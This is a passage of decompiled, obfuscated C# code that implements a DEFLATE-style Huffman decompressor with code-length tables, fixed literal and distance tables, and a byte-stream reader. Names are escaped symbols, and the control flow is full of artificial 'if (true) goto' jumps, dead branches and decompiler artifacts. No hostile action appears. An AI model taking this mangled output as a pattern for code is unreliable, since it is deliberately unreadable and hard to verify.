          goto label_40;
label_2:
        if (true)
          goto label_41;
label_9:
        int index1;
        int[] numArray3;
        int num1;
        int num2;
        while (true)
        {
          num1 = index1;
          num2 = obj0.Length;
          if (true)
          {
            int num3 = num2;
            if (num1 < num3)
            {
              int num4 = (int) obj0[index1];
              if (true)
                goto label_42;
label_4:
              int num5;
              if (num5 > 0)
              {
                int[] numArray4 = numArray3;
                if (true)
                  goto label_43;
label_6:
                int index2 = num5;
                if (true)
                  goto label_44;
label_7:
                int[] numArray5;
                int index3;
                numArray4[index2] = numArray5[(IntPtr) index3] + 1;
                goto label_8;
label_44:
                index3 = index2;
                goto label_7;
label_43:
                numArray5 = numArray4;
                goto label_6;
              }
label_8:
              ++index1;
              continue;
label_42:
              num5 = num4;
              goto label_4;
            }
            else
              break;
          }
          else
            goto label_14;
        }
        int num6 = 0;
        int length = 512;
        int index4;
        if (true)
        {
          index4 = 1;
          goto label_18;
        }
        else
          goto label_36;
label_14:
        int num7 = 16;
        int num8 = index4;
        int[] numArray6;
        if (true)
        {
          int num9 = num7 - num8 & 31;
          int num10 = num2 << num9;
          num6 = num1 + num10;
          if (index4 >= 10)
          {
            int num11 = numArray6[index4] & 130944;
            int num12 = num6 & 130944;
            length += num12 - num11 >> 16 - index4;
          }
          ++index4;
        }
        else
          goto label_23;
label_18:
        int num13;
        int index5;
        if (index4 <= 15)
        {
          numArray6[index4] = num6;
          int num14 = num6;
          num2 = numArray3[index4];
          num1 = num14;
          goto label_14;
        }
        else
        {
          this.\u0001 = new short[length];
          num13 = 512;
          index5 = 15;
          goto label_26;
        }
label_20:
        int num15 = num6 & 130944;
        num6 -= numArray3[index5] << 16 - index5;
        int num16 = num6 & 130944;
        goto label_24;
label_22:
        int num17;
        int num18 = num17 - 9;
        num8 = 31;
        num7 = num18;
        int num19;
        num2 = num19;
        int num20;
        num1 = num20;
label_23:
        int num21 = num7 & num8;
        int num22 = num2 << num21;
        num13 = num1 + num22;
        num16 += 128;
label_24:
        if (num16 < num15)
        {
          this.\u0001[(int) \u0004.\u0003.\u0006.\u0001(num16)] = (short) (-num13 << 4 | index5);
          num20 = num13;
          num19 = 1;
          num17 = index5;
          goto label_22;
        }
        else
          --index5;
label_26:
        int index6;
        if (index5 < 10)
        {
          index6 = 0;
          goto label_38;
        }
        else
          goto label_20;
label_36:
        int index7;
        numArray6[index7] = num6 + (1 << 16 - index7);
label_37:
        ++index6;
label_38:
        if (index6 >= obj0.Length)
          return;
        index7 = (int) obj0[index6];
        if (index7 != 0)
        {
          num6 = numArray6[index7];
          int index8 = (int) \u0004.\u0003.\u0006.\u0001(num6);
          if (index7 <= 9)
          {
            do
            {
              this.\u0001[index8] = (short) (index6 << 4 | index7);
              index8 += 1 << index7;
              if (false)
                goto label_20;
            }
            while (index8 < 512);
            goto label_36;
          }
          else
          {
            int num23 = (int) this.\u0001[index8 & 511];
            int num24 = 1 << (num23 & 15);
            int num25 = -(num23 >> 4);
            int num26;
            int num27;
            int num28;
            do
            {
              this.\u0001[num25 | index8 >> 9] = (short) (index6 << 4 | index7);
              num26 = index8;
              num27 = 1;
              num28 = index7 & 31;
              if (true)
              {
                int num29 = num27 << num28;
                index8 = num26 + num29;
              }
              else
                goto label_45;
            }
            while (index8 < num24);
            goto label_36;
label_45:
            num17 = num28;
            num19 = num27;
            num20 = num26;
            goto label_22;
          }
        }
        else
          goto label_37;
label_41:
        index1 = 0;
        goto label_9;
label_40:
        numArray6 = numArray2;
        goto label_2;
label_39:
        numArray3 = numArray1;
        goto label_1;
      }

      public int \u0001([In] \u0004.\u0003.\u0002 obj0)
      {
        int num1 = obj0.\u0001(9);
        if (true)
          goto label_27;
label_1:
        int index;
        int num2;
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        int num8;
        while (true)
        {
          int num9;
          if (num1 >= 0)
          {
            int num10 = (int) this.\u0001[index];
            int num11;
            while (true)
            {
              if (true)
                goto label_28;
label_4:
              num11 = 0;
              if (num11 != 0)
              {
                num10 = num11;
                continue;
              }
              break;
label_28:
              num2 = num10;
              goto label_4;
            }
            if (num10 < num11)
            {
              int num12 = -(num2 >> 4);
              if (true)
                goto label_30;
label_9:
              int num13 = num2 & 15;
              if (true)
                goto label_31;
label_10:
              int num14;
              num8 = obj0.\u0001(num14);
              if (true)
                goto label_32;
label_11:
              if (true)
              {
                if (num8 < 0)
                {
                  num9 = obj0.\u0001();
                  index = obj0.\u0001(num9);
                  num6 = (int) this.\u0001[num3 | index >> 9];
                  goto label_17;
                }
                else
                  goto label_13;
              }
              else
                goto label_14;
label_32:
              index = num8;
              goto label_11;
label_31:
              num14 = num13;
              goto label_10;
label_30:
              num3 = num12;
              goto label_9;
            }
            else
              break;
          }
          else
            goto label_21;
label_17:
          num2 = num6;
          if ((num2 & 15) <= num9)
          {
            obj0.\u0001(num2 & 15);
            num7 = num2 >> 4;
            if (false)
            {
              num1 = num7;
              continue;
            }
            goto label_15;
          }
          else
            goto label_20;
label_21:
          num4 = obj0.\u0001();
          index = obj0.\u0001(num4);
          num5 = (int) this.\u0001[index];
          if (num5 >= 0)
          {
            num6 = num5 & 15;
            if (true)
            {
              if (false)
                goto label_17;
              else
                goto label_24;
            }
            else
              goto label_33;
          }
          else
            goto label_26;
        }
        \u0004.\u0003.\u0002 obj = obj0;
        int num15 = num2 & 15;
        if (true)
          goto label_29;
label_7:
        return num2 >> 4;
label_29:
        obj.\u0001(num15);
        goto label_7;
label_13:
        int num16 = (int) this.\u0001[num3 | index >> 9];
        obj0.\u0001(num16 & 15);
        num8 = num16;
label_14:
        return num8 >> 4;
label_15:
        return num7;
label_20:
        return -1;
label_33:
        return num6;
label_24:
        int num17 = num4;
        if (num6 <= num17)
        {
          obj0.\u0001(num5 & 15);
          return num5 >> 4;
        }
label_26:
        return -1;
label_27:
        index = num1;
        goto label_1;
      }
    }

    internal sealed class \u0005
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private byte[] \u0003;
      private byte[] \u0004;
      private \u0004.\u0003.\u0004 \u0005;
      private int \u0006;
      private int \u0007;
      private int \u0008;
      private int \u000E;
      private int \u000F;
      private int \u0010;
      private byte \u0011;
      private int \u0012;
      private static readonly int[] \u0013;

      public bool \u0001([In] \u0004.\u0003.\u0002 obj0)
      {
        int num1;
        while (true)
        {
          int num2 = this.\u0006;
          if (true)
            goto label_43;
label_1:
          int num3;
          int num4;
          int num5;
          int num6;
          int num7;
          switch (num3)
          {
            case 0:
              this.\u0007 = obj0.\u0001(5);
              num1 = this.\u0007;
              if (true)
              {
                if (num1 >= 0)
                {
                  this.\u0007 += 257;
                  \u0004.\u0003.\u0002 obj = obj0;
                  if (true)
                    goto label_44;
label_7:
                  this.\u0006 = 1;
                  goto case 1;
label_44:
                  obj.\u0001(5);
                  goto label_7;
                }
                else
                  goto label_5;
              }
              else
                goto label_2;
            case 1:
              this.\u0008 = obj0.\u0001(5);
              if (this.\u0008 >= 0)
              {
                ++this.\u0008;
                \u0004.\u0003.\u0002 obj = obj0;
                if (true)
                  goto label_45;
label_11:
                this.\u000F = this.\u0007 + this.\u0008;
                this.\u0004 = new byte[this.\u000F];
                this.\u0006 = 2;
                goto case 2;
label_45:
                obj.\u0001(5);
                goto label_11;
              }
              else
                goto label_9;
            case 2:
              this.\u000E = obj0.\u0001(4);
              if (this.\u000E >= 0)
              {
                this.\u000E += 4;
                \u0004.\u0003.\u0002 obj = obj0;
                if (true)
                  goto label_46;
label_15:
                this.\u0003 = new byte[19];
                this.\u0012 = 0;
                this.\u0006 = 3;
                goto case 3;
label_46:
                obj.\u0001(4);
                goto label_15;
              }
              else
                goto label_13;
            case 3:
label_22:
              if (this.\u0012 < this.\u000E)
              {
                int num8 = obj0.\u0001(3);
                if (true)
                  goto label_47;
label_17:
                num5 = num4;
                num6 = 0;
                break;
label_47:
                num4 = num8;
                goto label_17;
              }
              else
              {
                this.\u0005 = new \u0004.\u0003.\u0004(this.\u0003);
                this.\u0003 = (byte[]) null;
                this.\u0012 = 0;
                this.\u0006 = 4;
                goto case 4;
              }
            case 4:
              int num9;
              int num10;
              int num11;
              do
              {
                num7 = this.\u0005.\u0001(obj0);
                if (true)
                {
                  num9 = num7;
                  if ((num7 & -16) == 0)
                  {
                    byte[] numArray = this.\u0004;
                    num3 = this.\u0012++;
                    int index = num3;
                    int num12 = (int) (this.\u0011 = (byte) num9);
                    numArray[index] = (byte) num12;
                    num10 = this.\u0012;
                    num11 = this.\u000F;
                    if (false)
                      goto label_49;
                  }
                  else
                    goto label_29;
                }
                else
                  goto label_40;
              }
              while (num10 != num11);
              goto label_26;
label_49:
              num6 = num11;
              num5 = num10;
              break;
label_29:
              if (num9 >= 0)
              {
                if (num9 >= 17)
                  this.\u0011 = (byte) 0;
                this.\u0010 = num9 - 16;
                this.\u0006 = 5;
                goto case 5;
              }
              else
                goto label_30;
            case 5:
              int num13 = \u0004.\u0003.\u0005.\u0002[this.\u0010];
              int num14 = obj0.\u0001(num13);
              if (num14 >= 0)
              {
                obj0.\u0001(num13);
                int num15 = num14 + \u0004.\u0003.\u0005.\u0001[this.\u0010];
                while (num15-- > 0)
                {
                  byte[] numArray = this.\u0004;
                  num3 = this.\u0012++;
                  int index = num3;
                  int num16 = (int) this.\u0011;
                  numArray[index] = (byte) num16;
                }
                int num17 = this.\u0012;
                num7 = this.\u000F;
                num7 = num17;
                goto label_40;
              }
              else
                goto label_35;
            default:
              continue;
          }
          if (num5 >= num6)
          {
            \u0004.\u0003.\u0002 obj = obj0;
            if (true)
              goto label_48;
label_21:
            this.\u0003[\u0004.\u0003.\u0005.\u0013[this.\u0012]] = (byte) num4;
            ++this.\u0012;
            goto label_22;
label_48:
            obj.\u0001(3);
            goto label_21;
          }
          else
            goto label_19;
label_40:
          if (num7 != num7)
          {
            this.\u0006 = 4;
            continue;
          }
          goto label_41;
label_43:
          num3 = num2;
          goto label_1;
        }
label_2:
        return num1 != 0;
label_5:
        return false;
label_9:
        return false;
label_13:
        return false;
label_19:
        return false;
label_26:
        return true;
label_30:
        return false;
label_35:
        return false;
label_41:
        return true;
      }

      public \u0004.\u0003.\u0004 \u0001()
      {
        byte[] numArray1 = new byte[this.\u0007];
        if (true)
          goto label_3;
label_1:
        byte[] sourceArray = this.\u0004;
        byte[] numArray2;
        byte[] destinationArray = numArray2;
        int length = this.\u0007;
        if (true)
          goto label_4;
label_2:
        return new \u0004.\u0003.\u0004(numArray2);
label_4:
        Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, length);
        goto label_2;
label_3:
        numArray2 = numArray1;
        goto label_1;
      }

      public \u0004.\u0003.\u0004 \u0002()
      {
        byte[] numArray1 = new byte[this.\u0008];
        if (true)
          goto label_3;
label_1:
        byte[] sourceArray = this.\u0004;
        int sourceIndex = this.\u0007;
        byte[] numArray2;
        byte[] destinationArray = numArray2;
        int length = this.\u0008;
        if (true)
          goto label_4;
label_2:
        return new \u0004.\u0003.\u0004(numArray2);
label_4:
        Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray, 0, length);
        goto label_2;
label_3:
        numArray2 = numArray1;
        goto label_1;
      }

      static \u0005()
      {
label_0:
        int[] numArray1 = new int[3];
        // ISSUE: field reference
        RuntimeFieldHandle fldHandle1 = __fieldref (\u0005.\u0002.\u000E);
        if (true)
          goto label_9;
label_1:
        \u0004.\u0003.\u0005.\u0001 = numArray1;
        int length;
        do
        {
          if (true)
          {
            length = 3;
            if (length != 0)
            {
              int[] numArray2 = new int[length];
              // ISSUE: field reference
              RuntimeFieldHandle fldHandle2 = __fieldref (\u0005.\u0002.\u000F);
              if (true)
                goto label_10;
label_5:
              \u0004.\u0003.\u0005.\u0002 = numArray2;
              continue;
label_10:
              RuntimeHelpers.InitializeArray((Array) numArray2, fldHandle2);
              goto label_5;
            }
            else
              goto label_7;
          }
          else
            goto label_0;
        }
        while (false);
        length = 19;
label_7:
        int[] numArray3 = new int[length];
        // ISSUE: field reference
        RuntimeFieldHandle fldHandle3 = __fieldref (\u0005.\u0002.\u0010);
        if (true)
          goto label_11;
label_8:
        \u0004.\u0003.\u0005.\u0013 = numArray3;
        return;
label_11:
        RuntimeHelpers.InitializeArray((Array) numArray3, fldHandle3);
        goto label_8;
label_9:
        RuntimeHelpers.InitializeArray((Array) numArray1, fldHandle1);
        goto label_1;
      }
    }

    internal sealed class \u0006
    {
      private static readonly int[] \u0001;
      private static readonly byte[] \u0002;
      private static readonly short[] \u0003;
      private static readonly byte[] \u0004;
      private static readonly short[] \u0005;
      private static readonly byte[] \u0006;

      public static short \u0001([In] int obj0) => (short) ((int) \u0004.\u0003.\u0006.\u0002[obj0 & 15] << 12 | (int) \u0004.\u0003.\u0006.\u0002[obj0 >> 4 & 15] << 8 | (int) \u0004.\u0003.\u0006.\u0002[obj0 >> 8 & 15] << 4 | (int) \u0004.\u0003.\u0006.\u0002[obj0 >> 12]);

      static \u0006()
      {
label_0:
        int[] numArray1 = new int[19];
        // ISSUE: field reference
        RuntimeFieldHandle fldHandle1 = __fieldref (\u0005.\u0002.\u0011);
        if (true)
          goto label_27;
label_1:
        \u0004.\u0003.\u0006.\u0001 = numArray1;
label_2:
        byte[] numArray2 = new byte[16];
        // ISSUE: field reference
        RuntimeFieldHandle fldHandle2 = __fieldref (\u0005.\u0002.\u0012);
        if (true)
          goto label_28;
label_3:
        \u0004.\u0003.\u0006.\u0002 = numArray2;
        \u0004.\u0003.\u0006.\u0003 = new short[286];
        \u0004.\u0003.\u0006.\u0004 = new byte[286];
        int index1;
        if (true)
        {
          if (true)
          {
            index1 = 0;
            goto label_8;
          }
          else
            goto label_8;
        }
        else
          goto label_10;
label_6:
        byte[] numArray3 = \u0004.\u0003.\u0006.\u0004;
        int index2 = index1;
        int num1 = index2 + 1;
        if (true)
          goto label_30;
label_7:
        numArray3[index2] = (byte) 8;
        goto label_8;
label_30:
        index1 = num1;
        goto label_7;
label_8:
        if (index1 < 144)
        {
          \u0004.\u0003.\u0006.\u0003[index1] = \u0004.\u0003.\u0006.\u0001(48 + index1 << 8);
          goto label_6;
        }
        else
          goto label_12;
label_10:
        byte[] numArray4 = \u0004.\u0003.\u0006.\u0004;
        int index3 = index1;
        int num2 = index3 + 1;
        if (true)
          goto label_31;
label_11:
        numArray4[index3] = (byte) 9;
        goto label_12;
label_31:
        index1 = num2;
        goto label_11;
label_12:
        if (index1 < 256)
        {
          \u0004.\u0003.\u0006.\u0003[index1] = \u0004.\u0003.\u0006.\u0001(256 + index1 << 7);
          goto label_10;
        }
        else
        {
          while (true)
          {
            int num3 = index1;
label_17:
            if (num3 < 280)
            {
              \u0004.\u0003.\u0006.\u0003[index1] = \u0004.\u0003.\u0006.\u0001(index1 - 256 << 9);
              if (true)
              {
                byte[] numArray5 = \u0004.\u0003.\u0006.\u0004;
                int index4 = index1;
                int num4 = index4 + 1;
                if (true)
                  goto label_32;
label_15:
                numArray5[index4] = (byte) 7;
                continue;
label_32:
                index1 = num4;
                goto label_15;
              }
              else
                goto label_0;
            }
            else
            {
              for (; index1 < 286; \u0004.\u0003.\u0006.\u0004[index1++] = (byte) 8)
                \u0004.\u0003.\u0006.\u0003[index1] = \u0004.\u0003.\u0006.\u0001(index1 - 88 << 8);
              \u0004.\u0003.\u0006.\u0005 = new short[30];
              \u0004.\u0003.\u0006.\u0006 = new byte[30];
              if (true)
              {
                int num5;
                for (index1 = 0; index1 < 30; index1 = num5 + 1)
                {
                  \u0004.\u0003.\u0006.\u0005[index1] = \u0004.\u0003.\u0006.\u0001(index1 << 11);
                  if (true)
                  {
                    \u0004.\u0003.\u0006.\u0006[index1] = (byte) 5;
                    num5 = index1;
                    if (false)
                    {
                      num3 = num5;
                      goto label_17;
                    }
                  }
                  else
                    goto label_2;
                }
                break;
              }
              goto label_6;
            }
          }
          return;
        }
label_28:
        RuntimeHelpers.InitializeArray((Array) numArray2, fldHandle2);
        goto label_3;
label_27:
        RuntimeHelpers.InitializeArray((Array) numArray1, fldHandle1);
        goto label_1;
      }
    }

    internal sealed class \u0007 : MemoryStream
    {
      public int \u0001() => this.ReadByte() | this.ReadByte() << 8;

      public int \u0002() => this.\u0001() | this.\u0001() << 16;

      public \u0007([In] byte[] obj0)
        : base(obj0, false)
      {
      }
    }
  }
}
